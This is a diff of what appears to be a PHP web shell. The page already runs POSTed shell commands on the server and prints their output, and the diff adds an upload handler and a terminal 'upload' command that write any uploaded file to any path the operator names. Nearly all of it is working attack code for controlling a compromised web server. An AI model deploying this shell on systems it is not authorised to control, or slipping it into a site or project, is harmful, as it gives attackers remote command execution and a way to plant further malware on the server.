@@ -6,6 +6,18 @@ if (ISSET($_POST['cmd'])) {
         echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
     }
     die(); 
+} else if (ISSET($_FILES['file']['tmp_name']) && ISSET($_POST['path'])) {
+    $filename = $_FILES["file"]["name"];
+    $path = $_POST['path'];
+    if ($path != "/") {
+        $path .= "/";
+    } 
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
+        echo $filename." successfully uploaded to ".$path;
+    } else {
+        echo "Error uploading ".$filename;
+    }
+    die();
 }
 ?>
 
@@ -54,7 +66,7 @@ if (ISSET($_POST['cmd'])) {
                 line-height: 20px;
             }
                                  
-            form {
+            .input form {
                 position: relative;
                 margin-bottom: 0px;
             }
@@ -114,6 +126,9 @@ if (ISSET($_POST['cmd'])) {
                 </form>
             </div>
         </div>
+        <form id="upload" method="POST" style="display: none;">
+            <input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
+        </form>
         <script type="text/javascript">
             var username = "";
             var hostname = "";
@@ -126,6 +141,8 @@ if (ISSET($_POST['cmd'])) {
             var inputElement = document.getElementById("input");
             var outputElement = document.getElementById("output");
             var usernameElement = document.getElementById("username");
+            var uploadFormElement = document.getElementById("upload");
+            var fileBrowserElement = document.getElementById("filebrowser");
             getShellInfo();
             
             function getShellInfo() {
@@ -174,6 +191,9 @@ if (ISSET($_POST['cmd'])) {
                 } else if (parsedCommand[0] == "clear") {
                     outputElement.innerHTML = "";
                     return false;
+                } else if (parsedCommand[0] == "upload") {
+                    fileBrowserElement.click();
+                    return false;
                 } else {
                     command = "cd "+currentDir+"; " + command;
                 }
@@ -198,6 +218,24 @@ if (ISSET($_POST['cmd'])) {
                 request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                 request.send("cmd="+encodeURIComponent(command));
                 return false;
+            }
+            
+            function uploadFile() {
+                var formData = new FormData();
+                formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
+                formData.append('path', currentDir);
+                
+                var request = new XMLHttpRequest();
+                
+                request.onreadystatechange = function() {
+                    if (request.readyState == XMLHttpRequest.DONE) {
+                        outputElement.innerHTML += request.responseText+"<br>";
+                    }
+                };
+
+                request.open("POST", "", true);
+                request.send(formData);
+                outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
             }
             
             function updateInputWidth() {
